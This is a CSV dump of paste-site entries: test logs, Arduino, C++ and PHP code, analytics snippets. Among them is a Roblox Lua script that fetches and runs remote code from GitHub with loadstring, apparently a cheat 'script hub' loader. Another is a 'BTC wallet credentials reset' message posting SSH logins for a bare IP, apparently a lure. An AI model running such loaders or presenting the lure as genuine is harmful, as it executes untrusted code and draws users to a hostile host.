id,title,username,language,date,content
6QjzjSaj,Libreswan_xfrm_refcount_ip_test_failure,bradyallenjohnson,Bash,Friday 14th of July 2023 06:52:30 AM CDT,"$ ./testing/utils/namespace-runner.py -j 1 basic-pluto-01
running queue of 1
testlist: basic-pluto-01
START: basic-pluto-01
   FAILED: basic-pluto-01



-----------------------
total  tests: 1
passed tests: 0
failed tests: 1
runtime: 00:00:12
-----------------------
passed tests: 
-----------------------
failed tests: basic-pluto-01


$ cd testing/pluto/basic-pluto-01/OUTPUT

$ more east.console.diff
--- east.console.txt	2023-07-14 11:36:25.268642730 +0000
+++ OUTPUT/east.console.txt	2023-07-14 11:43:58.027788010 +0000
@@ -136,7 +136,6 @@
 	replay-window 0 flag af-unspec
 	auth-trunc hmac(sha1) 0xHASHKEY 96
 	enc cbc(aes) 0xENCKEY
-	lastused YYYY-MM-DD HH:MM:SS
 	anti-replay esn context:
 	 seq-hi 0x0, seq 0xXX, oseq-hi 0x0, oseq 0xXX
 	 replay_window 128, bitmap-length 4
@@ -146,7 +145,6 @@
 	replay-window 0 flag af-unspec
 	auth-trunc hmac(sha1) 0xHASHKEY 96
 	enc cbc(aes) 0xENCKEY
-	lastused YYYY-MM-DD HH:MM:SS
 	anti-replay esn context:
 	 seq-hi 0x0, seq 0xXX, oseq-hi 0x0, oseq 0xXX
 	 replay_window 128, bitmap-length 4


$ grep lastused *
east.console.diff:-	lastused YYYY-MM-DD HH:MM:SS
east.console.diff:-	lastused YYYY-MM-DD HH:MM:SS
east.pluto.log:| kernel: get_ipsec_traffic() bytes=0 add_time=1689335035 lastused=0
east.pluto.log:| kernel: get_ipsec_traffic() bytes=0 add_time=1689335035 lastused=0
east.pluto.log:| kernel: get_ipsec_traffic() bytes=0 add_time=1689335035 lastused=0
east.pluto.log:| kernel: get_ipsec_traffic() bytes=0 add_time=1689335035 lastused=0
east.pluto.log:| kernel: get_ipsec_traffic() bytes=0 add_time=1689335035 lastused=0
east.pluto.log:| kernel: get_ipsec_traffic() bytes=0 add_time=1689335035 lastused=0
east.pluto.log:| kernel: get_ipsec_traffic() bytes=84 add_time=1689335035 lastused=0
east.pluto.log:| kernel: get_ipsec_traffic() bytes=84 add_time=1689335035 lastused=0
east.pluto.log:| kernel: get_ipsec_traffic() bytes=84 add_time=1689335035 lastused=0
east.pluto.log:| kernel: get_ipsec_traffic() bytes=84 add_time=1689335035 lastused=0
west.console.diff:-	lastused YYYY-MM-DD HH:MM:SS
west.console.diff:-	lastused YYYY-MM-DD HH:MM:SS
west.pluto.log:| kernel: get_ipsec_traffic() bytes=0 add_time=1689335035 lastused=0
west.pluto.log:| kernel: get_ipsec_traffic() bytes=0 add_time=1689335035 lastused=0
west.pluto.log:| kernel: get_ipsec_traffic() bytes=0 add_time=1689335035 lastused=0
west.pluto.log:| kernel: get_ipsec_traffic() bytes=0 add_time=1689335035 lastused=0
west.pluto.log:| kernel: get_ipsec_traffic() bytes=0 add_time=1689335035 lastused=0
west.pluto.log:| kernel: get_ipsec_traffic() bytes=0 add_time=1689335035 lastused=0
west.pluto.log:| kernel: get_ipsec_traffic() bytes=84 add_time=1689335035 lastused=0
west.pluto.log:| kernel: get_ipsec_traffic() bytes=84 add_time=1689335035 lastused=0
west.pluto.log:| kernel: get_ipsec_traffic() bytes=84 add_time=1689335035 lastused=0
west.pluto.log:| kernel: get_ipsec_traffic() bytes=84 add_time=1689335035 lastused=0
west.pluto.log:| kernel: get_ipsec_traffic() bytes=84 add_time=1689335035 lastused=0
west.pluto.log:| kernel: get_ipsec_traffic() bytes=84 add_time=1689335035 lastused=0
"
w0njVKDR,Untitled,Darwinwaswrong,C++,Friday 14th of July 2023 06:40:56 AM CDT," #include<Wire.h>                //I2C Wire Library
    #include<Servo.h>               //Servo Motor Library
    ​
    Servo servo_1;
    Servo servo_2;
    Servo servo_3;
    Servo servo_4;
    ​
    const int MPU_addr=0x68;        //MPU6050 I2C Address
    ​
    int16_t axis_X, axis_Y, axis_Z;
    int minVal=265;
    int maxVal=402;
    ​
    double x;
    double y;
    double z;
    ​
    void setup()
    {
      Serial.begin(9600);
    ​
      Wire.begin();                      //Initilize I2C Communication
      Wire.beginTransmission(MPU_addr);  //Start communication with MPU6050
      Wire.write(0x6B);                  //Writes to Register 6B
      Wire.write(0);                     //Writes 0 into 6B Register to Reset
      Wire.endTransmission(true);        //Ends I2C transmission
    ​
      servo_1.attach(2);   // Forward/Reverse_Motor
      servo_2.attach(3);   // Up/Down_Motor
      servo_3.attach(4);    // Forward/Reverse_Motor
      servo_4.attach(5);   // Left/Right_Motor
    }
    ​
    void loop()
    {
      Wire.beginTransmission(MPU_addr);
      Wire.write(0x3B);                  //Start with regsiter 0x3B
      Wire.endTransmission(false);
      Wire.requestFrom(MPU_addr,14,true);  //Read 14 Registers
    ​
      axis_X=Wire.read()<<8|Wire.read();                //Reads the MPU6050 X,Y,Z AXIS Value
      axis_Y=Wire.read()<<8|Wire.read();
      axis_Z=Wire.read()<<8|Wire.read();
    ​
      int xAng = map(axis_X,minVal,maxVal,-90,90);     // Maps axis values in terms of -90 to +90
      int yAng = map(axis_Y,minVal,maxVal,-90,90);
      int zAng = map(axis_Z,minVal,maxVal,-90,90);
    ​
      x= RAD_TO_DEG * (atan2(-yAng, -zAng)+PI);       //Formula to convert into degree
      y= RAD_TO_DEG * (atan2(-xAng, -zAng)+PI);
      z= RAD_TO_DEG * (atan2(-yAng, -xAng)+PI);
    ​
      // forward backward using 2 mid servo(m1 m3)-ROLL
      if (x >=0 && x <= 60)
      {
         int mov1 = map(x,0,60,0,90);
         Serial.print(""Movement in up/down = "");
         Serial.print(mov1);
         Serial.println((char)176);
         servo_1.write(mov1),servo_3.write(mov1);
      }
      else if (x >=300 && x <= 360)
      {
         int mov1 = map(x,360,250,0,180);
         Serial.print(""Movement in Up/Down = "");
         Serial.print(mov1);
         Serial.println((char)176);
         servo_1.write(mov1),servo_3.write(mov1);
      }
    ​
      // up and down using m2-PITCH
      if (y >=0 && y <= 60)
      {
         int mov2 = map(y,0,60,0,90);
         Serial.print(""Movement in F/R = "");
         Serial.print(mov2);
         Serial.println((char)176);
         servo_4.write(mov2);
      }
      else if(y >=300 && y <= 360)
      {
         int mov2 = map(y,360,250,0,180);
         Serial.print(""Movement in F/R = "");
         Serial.print(mov2);
         Serial.println((char)176);
         servo_4.write(mov2);
      }
    ​
      // left right using bottom servo(m4)-YAW
      if(z >=0 && z <= 60)
      {
         int mov3 = map(z,0,60,90,180);
         Serial.print(""Movement in Left = "");
         Serial.print(mov3);
         Serial.println((char)176);
         servo_2.write(mov3);
      }
      else if (z >=300 && z <= 360)
      {
         int mov3 = map(z,360,300,90,0);
         Serial.print(""Movement in Right = "");
         Serial.print(mov3);
         Serial.println((char)176);
         servo_2.write(mov3);
      }
    }

"
2NV103DT,Untitled,LazerBloxx,Lua,Friday 14th of July 2023 06:39:29 AM CDT,"local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Player = game.Players.LocalPlayer
local Window = OrionLib:MakeWindow({Name = ""Lynch Syndicate"", HidePremium = false, SaveConfig = false})

OrionLib:MakeNotification({
	Name = ""Logged in!"",
	Content = ""You are logged in as ""..Player.Name..""."",
	Image = ""rbxassetid://12738913447"",
	Time = 5
})

local key = ""yuh""

function CorrectKeyNotification()
  OrionLib:MakeNotification({
	Name = ""Correct Key!"",
	Content = ""You have entered the correct key"",
	Image = ""rbxassetid://12738913447"",
	Time = 5
})
end

function IncorrectKeyNotification()
  OrionLib:MakeNotification({
	Name = ""Incorrect Key!"",
	Content = ""You have entered the incorrect key"",
	Image = ""rbxassetid://12738913447"",
	Time = 5
})
end

function MakeScriptHub()
  loadstring(game:HttpGet(""https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt"", true))()
end

function DestroyUI()
  OrionLib:Destroy()
end

local Tab = Window:MakeTab({
	Name = ""Key"",
	Icon = ""rbxassetid://11330899276"",
	PremiumOnly = false
})

Tab:AddTextbox({
	Name = ""Enter Key"",
	Default = ""Enter Key"",
	TextDisappear = false,
	Callback = function(Value)
	  local key = Value
	end	  
})

Tab:AddButton({
	Name = ""Check Key!"",
	Callback = function()
      	if tostring(key) == ""yuh""
      	print(""random sht has executed"")
      	else
      	  print(""wrong key bozo ass kid"")
      	  end
  	end    
})

OrionLib:Init()"
fSz6ZT9N,Untitled,FladeX,HTML,Friday 14th of July 2023 06:16:30 AM CDT,"<!-- Yandex.Metrika counter -->
<script type=""text/javascript"" >
   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
   m[i].l=1*new Date();
   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
   (window, document, ""script"", ""https://mc.yandex.ru/metrika/tag.js"", ""ym"");

   ym(94306699, ""init"", {
        clickmap:true,
        trackLinks:true,
        accurateTrackBounce:true,
        webvisor:true
   });
</script>
<noscript><div><img src=""https://mc.yandex.ru/watch/94306699"" style=""position:absolute; left:-9999px;"" alt="""" /></div></noscript>
<!-- /Yandex.Metrika counter -->"
HcQcjMGi,BTC Wallet Credentials have been reset,steedaerod_88,GetText,Friday 14th of July 2023 06:14:53 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials are 2lajozgj:jZc4GT on 45.9.148.244
You can connect via SSH.
Regards"
P0sLYzEf,Untitled,FladeX,HTML,Friday 14th of July 2023 06:08:28 AM CDT,"<!-- Yandex.Metrika counter -->
<script type=""text/javascript"" >
   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
   m[i].l=1*new Date();
   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
   (window, document, ""script"", ""https://mc.yandex.ru/metrika/tag.js"", ""ym"");

   ym(94306638, ""init"", {
        clickmap:true,
        trackLinks:true,
        accurateTrackBounce:true,
        webvisor:true
   });
</script>
<noscript><div><img src=""https://mc.yandex.ru/watch/94306638"" style=""position:absolute; left:-9999px;"" alt="""" /></div></noscript>
<!-- /Yandex.Metrika counter -->"
899ddGdr,Untitled,35657,C++,Friday 14th of July 2023 06:01:43 AM CDT,"
#include <string>
#include <iostream>

using namespace std;

//млекопитающее
class Mammal {
public:
    void SetGender(string gender) {
        gender_ = gender;
    }

    void SetAge(int age) {
        age_ = age;
    }

    int GetAge() const {
        return age_;
    }
    string GetGender() const {
        return gender_;
    }

    void SetWeight(int weight) {
        weight_ = weight;
    }

    int GetWeight() {
        return weight_;
    }

    void SetHeight(int height) {
        height_ = height;
    }

    int GetHeight() {
        return height_;
    }

private:
    string gender_;
    int age_;
    int weight_;
    int height_;
};


// Человек
class Person : public virtual Mammal {

public:

    void SetName(string name) {
        name_ = name;
    }

    string GetName() const {
        return name_;
    }

    virtual void Speak() {
        cout << ""Привет!"" << endl;
    }

private:
    string name_;
};


class Wolf : public virtual Mammal {

public:

    void SetColour(string colour) {
        colour_ = colour;
    }

    string GetColour() {
        return colour_;
    }

private:
    string colour_;
};


class Warewolf : public Person, public Wolf {
public:
    void Speak() override {
        cout << ""У-у-у-у-у-у!"" << endl;
    }
};


int main() {
    setlocale(LC_ALL, ""ru"");

    Warewolf wf;

    wf.SetName(""John"");
    wf.SetColour(""Gray"");
    wf.SetAge(10);
    cout << wf.GetName() << "" "" << wf.GetColour() << "" "" << wf.GetAge() << endl;
    wf.Speak();
}"
W7fcvQRP,data633,TestGuy1,JSON,Friday 14th of July 2023 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '8d1dadd3571b303b920427436ff3e52610b7f2717adca08dd06e8b178585331d125a7800391f7a010c602776162e3716883e953720b7445135fd3280da6787ff5cacffa523262d8701d89465fbf9defa44b6af367cb054061de18d0865b65ba6f9cec313151fcd00df6cc90f7048b14f0271ff3cbab6a4566ede69ed255dbced',
  otherdata: [
    'e6bb7c53721abfffcf339fb05799f958',
    'b4af463456cf4c1a4692be29412873c8',
    '713f26da10b2825a55353e664299557b',
    'e1ac985bb88ba2b4d21f156dd5536dfe',
    'fbb726339d4671c4c3611b5386a3ca9a',
    '4312c01d825e4e02ce80940387b606bb',
    '67d8596e965609498d380bbfbfc967fc',
    '229f787867eb2b0bec3b7ec9f1bd270b'
  ]
}"
RFzrzvXF,Untitled,35657,C++,Friday 14th of July 2023 05:59:52 AM CDT,"
#include <string>
#include <iostream>

using namespace std;


// Человек
class Person {
public:

    void SetName(string name) {
        name_ = name;
    }

    void SetGender(string gender) {
        gender_ = gender;
    }

    void SetAge(int age) {
        age_ = age;
    }

    string GetName() const {
        return name_;
    }
    int GetAge() const {
        return age_;
    }
    string GetGender() const {
        return gender_;
    }

    virtual void Speak() {
        cout << ""Привет!"" << endl;
    }

    string name_;
    string gender_;
    int age_;
};


class Wolf {

public:
    void SetWeight(int weight) {
        weight_ = weight;
    }

    int GetWeight() {
        return weight_;
    }

    void SetHeight(int height) {
        height_ = height;
    }

    int GetHeight() {
        return height_;
    }

    void SetColour(string colour) {
        colour_ = colour;
    }

    string GetColour() {
        return colour_;
    }

private:
    int weight_;
    int height_;
    string colour_;
};


class Warewolf : public Person, public Wolf {
public:
    void Speak() override {
        cout << ""У-у-у-у-у-у!"" << endl;
    }
};


int main() {
    setlocale(LC_ALL, ""ru"");

    Warewolf wf;

    wf.SetName(""John"");
    wf.SetColour(""Gray"");
    cout << wf.GetName() << "" "" << wf.GetColour() << endl;
    wf.Speak();
}"
Q6K41xuL,Untitled,orie404,PHP,Friday 14th of July 2023 05:45:54 AM CDT,"<?php

namespace App\Http\Controllers\Payment;

use App\Http\Traits\PaymentTrait;
use App\Http\Controllers\Controller;
use App\Models\Earning;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Midtrans\Transaction;

class MidtransController extends Controller
{
    use PaymentTrait;

    public function success(Request $request)
    {

        $job_payment_type = session('job_payment_type') ?? 'package_job';
        $payload = $request->all();

        Log::info('incoming-midtrans', [
            'payload'   => $payload
        ]);

        $orderId = $payload['ordeer_id'];
        $statusCode = $payload['status_code'];
        $grossAmount = $payload['gross_amount'];

        $reqSignature = $payload['signature_key'];

        $signature = hash('sha512', $orderId . $statusCode . $grossAmount . config('midtrans.key'));

        if ($signature != $reqSignature) {
            return response()->json([
                'message' => 'invalid signature'
            ], 401);
        }

        $order = Transaction::find($orderId);
        $transactionStatus = $payload['transaction_status'];

        if (!$order) {
            return response()->json([
                ""message"" => ""invalid order""
            ], 400);
        }

        if ($transactionStatus == 'settlement') {
            $order->status = 'PAID';
            $order->save();
        } elseif ($transactionStatus == 'expire') {
            $order->status = 'expire';
            $order->save();
        }
        $usd_amount = currencyConversion($payload['gross_amount']);

        Earning::create([
            'order_id' => $payload['order_id'],
            'transaction_id' => $payload['transaction_id'],
            'payment_provider' => $payload['payment_type'],
            'plan_id' => $payload['gross_amount'],
            'company_id' => auth('user')->user()->company->id,
            'amount' => $payload['gross_amount'],
            'currency_symbol' => config('jobpilot.currency_symbol'),
            'usd_amount' => $usd_amount,
            'payment_type' => $job_payment_type == 'per_job' ? 'per_job_based' : 'subscription_based',
        ]);

        // plan data store
        $this->orderPlacing(false);

        // forget midtrans session
        session()->forget('payment_details');
        session()->flash('success', 'Payment Successfully');

        // redirect url pass
        return response()->json([
            'redirect_url' => route('company.plan'),
        ]);
    }
}
"
